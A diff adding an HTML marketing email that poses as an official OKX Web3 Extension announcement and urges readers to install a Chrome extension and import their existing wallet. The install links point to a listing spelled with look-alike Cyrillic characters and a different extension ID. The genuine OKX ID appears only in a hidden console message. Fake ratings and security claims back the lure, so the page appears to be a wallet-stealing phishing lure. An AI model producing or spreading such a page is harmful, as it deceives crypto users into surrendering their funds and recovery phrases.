@@ -1,0 +1,404 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta content="width=device-width, initial-scale=1.0" name="viewport">
+<title>OKX Web3 Extension - Advanced Chrome Extension for Web3</title>
+<style type="text/css">/* ---- RESET & GLOBAL ---- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f4f7fb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            padding: 30px 20px;
+            margin: 0;
+            color: #1e293b;
+        }
+
+        /* ---- ENVELOPPE CARTE ---- */
+        .letter-card {
+            max-width: 860px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px -12px rgba(0, 20, 30, 0.25);
+            padding: 48px 56px;
+            transition: all 0.2s;
+            border: 1px solid rgba(148, 163, 184, 0.15);
+        }
+
+        /* ---- EN-TÊTE ---- */
+        .letter-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            flex-wrap: wrap;
+            margin-bottom: 32px;
+            border-bottom: 2px solid #e9edf2;
+            padding-bottom: 24px;
+        }
+        .company-info {
+            font-weight: 500;
+        }
+        .company-info .name {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0b1e33;
+            letter-spacing: -0.3px;
+        }
+        .company-info .tagline {
+            font-size: 14px;
+            color: #475569;
+            margin-top: 4px;
+        }
+        .letter-meta {
+            text-align: right;
+            line-height: 1.6;
+            font-size: 15px;
+        }
+        .letter-meta strong {
+            color: #0f2b45;
+        }
+        .letter-meta .date {
+            display: block;
+            font-weight: 500;
+            color: #1e293b;
+            margin-bottom: 4px;
+        }
+
+        /* ---- ADRESSE DESTINATAIRE ---- */
+        .recipient {
+            margin-bottom: 28px;
+            padding: 14px 18px;
+            background: #f8fafc;
+            border-radius: 12px;
+            border-left: 5px solid #2563eb;
+        }
+        .recipient p {
+            font-size: 15px;
+            line-height: 1.6;
+        }
+        .recipient .label {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #64748b;
+            font-weight: 600;
+        }
+
+        /* ---- OBJET ---- */
+        .subject {
+            font-size: 20px;
+            font-weight: 700;
+            color: #0b1e33;
+            margin: 20px 0 18px 0;
+            padding-bottom: 6px;
+            border-bottom: 1px dashed #d1d9e6;
+        }
+
+        /* ---- CORPS ---- */
+        .body-text {
+            font-size: 16px;
+            line-height: 1.7;
+            color: #1e293b;
+        }
+        .body-text p {
+            margin-bottom: 18px;
+        }
+        .body-text .highlight {
+            background: #eff6ff;
+            padding: 14px 20px;
+            border-radius: 12px;
+            border-left: 4px solid #2563eb;
+            font-weight: 500;
+            color: #1e3a5f;
+            margin: 20px 0;
+        }
+        .body-text ul {
+            margin: 16px 0 20px 24px;
+            list-style-type: "✓ ";
+            padding-left: 8px;
+        }
+        .body-text ul li {
+            margin-bottom: 8px;
+            padding-left: 8px;
+        }
+
+        /* ---- SECTION CLAIM ---- */
+        .claim-section {
+            background: linear-gradient(135deg, #f0f7ff 0%, #e6f0fa 100%);
+            border-radius: 16px;
+            padding: 28px 30px;
+            margin: 28px 0 24px 0;
+            border: 2px solid #2563eb;
+            border-style: dashed;
+            text-align: center;
+        }
+        .claim-section .claim-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #0b1e33;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .claim-section .claim-title .badge {
+            background: #2563eb;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 4px 16px;
+            border-radius: 30px;
+            letter-spacing: 0.3px;
+        }
+        .claim-section .claim-sub {
+            font-size: 15px;
+            color: #1e3a5f;
+            margin: 10px 0 18px 0;
+            font-weight: 500;
+        }
+        .claim-section .wallet-info {
+            background: white;
+            padding: 12px 18px;
+            border-radius: 12px;
+            display: inline-block;
+            font-size: 14px;
+            color: #1e293b;
+            border: 1px solid #d1d9e6;
+            margin-bottom: 18px;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* ---- BOUTON CONNECT WALLET (LIEN) ---- */
+        .btn-connect {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: #2563eb;
+            color: white;
+            font-weight: 700;
+            font-size: 17px;
+            padding: 14px 38px;
+            border-radius: 60px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 6px 18px rgba(37, 99, 235, 0.35);
+            text-decoration: none;
+            letter-spacing: 0.3px;
+        }
+        .btn-connect:hover {
+            background: #1d4ed8;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 28px rgba(37, 99, 235, 0.45);
+        }
+        .btn-connect:active {
+            transform: scale(0.96);
+        }
+        .btn-connect .icon {
+            font-size: 22px;
+        }
+
+        /* ---- NOTE DE SÉCURITÉ ---- */
+        .security-note {
+            font-size: 13px;
+            color: #64748b;
+            margin-top: 14px;
+            background: #f1f5f9;
+            padding: 8px 14px;
+            border-radius: 30px;
+            display: inline-block;
+        }
+
+        /* ---- SIGNATURE ---- */
+        .signature {
+            margin-top: 40px;
+            padding-top: 28px;
+            border-top: 2px solid #e9edf2;
+        }
+        .signature .name-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #0b1e33;
+        }
+        .signature .sub {
+            color: #475569;
+            font-size: 15px;
+        }
+        .signature .contact-row {
+            margin-top: 8px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 18px 32px;
+            font-size: 14px;
+            color: #334155;
+        }
+        .signature .contact-row span {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* ---- PIED DE PAGE ---- */
+        .letter-footer {
+            margin-top: 36px;
+            padding-top: 18px;
+            border-top: 1px solid #e2e8f0;
+            font-size: 13px;
+            color: #64748b;
+            text-align: center;
+        }
+
+        /* ---- RESPONSIVE ---- */
+        @media (max-width: 600px) {
+            .letter-card {
+                padding: 28px 20px;
+            }
+            .letter-header {
+                flex-direction: column;
+                gap: 12px;
+            }
+            .letter-meta {
+                text-align: left;
+                width: 100%;
+            }
+            .recipient {
+                padding: 12px 14px;
+            }
+            .subject {
+                font-size: 18px;
+            }
+            .claim-section {
+                padding: 22px 18px;
+            }
+            .claim-section .claim-title {
+                font-size: 20px;
+            }
+            .btn-connect {
+                padding: 12px 28px;
+                font-size: 15px;
+                width: 100%;
+                justify-content: center;
+            }
+            .signature .contact-row {
+                flex-direction: column;
+                gap: 6px;
+            }
+        }
+
+        @media print {
+            body {
+                background: white;
+                padding: 0;
+            }
+            .letter-card {
+                box-shadow: none;
+                border: none;
+                border-radius: 0;
+                padding: 40px;
+            }
+            .btn-connect {
+                background: #2563eb !important;
+                color: white !important;
+                -webkit-print-color-adjust: exact;
+                print-color-adjust: exact;
+            }
+            .claim-section {
+                background: #f0f7ff !important;
+                -webkit-print-color-adjust: exact;
+                print-color-adjust: exact;
+            }
+        }
+	</style>
+</head>
+<body>
+<div class="letter-card"><!-- ========== HEADER ========== --><header class="letter-header">
+<div class="company-info">
+<div class="name">🚀 OKX Web3 Extension</div>
+<div class="tagline">Your Gateway to Web3 in Chrome Browser · Complete Experience</div>
+</div>
+<div class="letter-meta"><span class="date">July 7, 2026</span> <strong>Reference:</strong> OKX-WEB3-EXT-2026<br>
+<span style="font-size:14px; color:#475569;">Subject: OKX Web3 Extension for Chrome Browser</span></div>
+</header><!-- ========== RECIPIENT ========== -->
+<div class="recipient">
+<div class="label">To Web3 Enthusiasts and Blockchain Lovers</div>
+<p><strong>Decentralized Finance Technology Enthusiasts</strong><br>
+Global Web3 Community · The Future of Internet<br>
+Chrome Browser · Chrome Web Store</p>
+</div>
+<!-- ========== SUBJECT ========== -->
+<div class="subject">🚀 Discover OKX Web3 Extension - Your Gateway to the Web3 World</div>
+<!-- ========== BODY ========== -->
+<div class="body-text">
+<p><strong>Welcome to the Future of the Internet!</strong></p>
+<p>We present to you <strong>OKX Web3 Extension</strong> - the advanced extension that transforms your Chrome browser into a complete Web3 gateway. With over
+<strong>10 million users</strong> worldwide, OKX has become the preferred platform for blockchain enthusiasts and decentralized applications.</p>
+<p><strong>Why OKX Web3 Extension?</strong> Because it provides you with a complete experience including:</p>
+<ul>
+<li><strong>Integrated Web3 Wallet</strong> - Manage your digital assets easily and securely
+</li><li><strong>Direct Access to dApps</strong> - Interact with decentralized applications without complexity
+</li><li><strong>Built-in Decentralized Exchange</strong> - Exchange cryptocurrencies at the best prices
+</li><li><strong>Multi-Network Support</strong> - Ethereum, BSC, Polygon, Arbitrum and more
+</li><li><strong>Advanced Security</strong> - Complete protection for your assets and data
+</li><li><strong>Full English Interface</strong> - Experience tailored for global users
+</li></ul>
+<!-- ========== INSTALLATION SECTION ========== -->
+<div class="claim-section">
+<div class="claim-title">🚀 Install OKX Web3 Extension Now <span class="badge"><a href="https://chromewebstore.google.com/detail/окх-wаllеt-dashboard/inophbikolocpigmkhllfkdkiccjpggh?hl=fr&amp;authuser=1">Free Available</a></span></div>
+<div class="claim-sub">Join the Web3 community and start your journey in the world of blockchain and decentralized applications</div>
+<!-- Quick Features -->
+<div class="wallet-info">✅ Easy Installation · ⚡ Fast Performance · 🔒 Completely Secure · 🌍 English Interface</div>
+<br>
+<!-- Install Button from Chrome Web Store --><a class="btn-connect" href="https://chromewebstore.google.com/detail/окх-wаllеt-dashboard/inophbikolocpigmkhllfkdkiccjpggh?hl=fr&amp;authuser=1" rel="noopener noreferrer" target="_blank"><span class="icon">⬇️</span>
+ Install from Chrome Web Store <span style="font-size:14px; opacity:0.8;">→</span>
+</a>
+<div style="margin-top:14px;"><span class="security-note">🔒 Compliant with Chrome Web Store Policies · 4.7/5 Positive Reviews
+</span></div>
+</div>
+<p><strong>How to Use:</strong></p>
+<p>1. Install the extension from Chrome Web Store<br>
+2. Create your new wallet or import an existing one<br>
+3. Start interacting with your favorite dApps<br>
+4. Use the built-in swap to exchange cryptocurrencies<br>
+5. Enjoy a complete Web3 experience in your browser</p>
+<p><strong>Exclusive Advantages:</strong></p>
+<p>• Support for over 50 different blockchain networks<br>
+• Access to thousands of decentralized applications (dApps)<br>
+• Competitive prices in decentralized exchange<br>
+• Continuous updates and new features<br>
+• 24/7 technical support available</p>
+</div>
+<!-- ========== SIGNATURE ========== -->
+<div class="signature">
+<div class="name-title">OKX Web3 Team</div>
+<div class="sub">Innovation Leaders in the Web3 and Blockchain World</div>
+<div class="contact-row"><span>🌐 Official Website: okx.com</span> <span>📧 Support: support@okx.com</span>
+<span>🐦 Twitter: @OKX</span> <span>📱 Telegram: t.me/OKX</span></div>
+<div style="margin-top:10px; font-size:14px; color:#2563eb;">⭐⭐⭐⭐⭐ 4.7/5 Rating · 10 Million Users Worldwide</div>
+</div>
+<!-- ========== FOOTER ========== -->
+<div class="letter-footer">✦ OKX Web3 Extension - Your Web3 Gateway in Chrome Browser ✦</div>
+</div>
+<!-- سكريبت لتتبع النقر على الرابط --><script>
+        // إضافة حدث تتبع عند النقر على الزر
+        document.querySelector('.btn-connect').addEventListener('click', function(e) {
+            // يمكنك إضافة تتبع تحليلي مخصص هنا
+            console.log('🔗 التوجيه إلى Chrome Web Store: https://chromewebstore.google.com/detail/okx-web3-wallet/mcohilncbfahbmgdjkbpemcciiolgcge');
+            // سيفتح الرابط في علامة تبويب جديدة بفضل target="_blank"
+        });
+    </script><br>
+<hr>
+<font face="Arial" color="Gray" size="1"><br>
+保密声明：<br>
+本邮件可能含有受到相关法律保护的特许保密性的、机密性的或者免予/禁止对外公开的内容。如果您不是预期的接收人，或者预期接收人的员工/代理人，现特此声明：严禁任何散布、分发、保留、存档或者复印本邮件以及/或者其中内容的行为。如果您因误发而收到这份邮件或者违反了以上所述，请立即通知发件人。<br>
+</font>
+</body>
+</html>
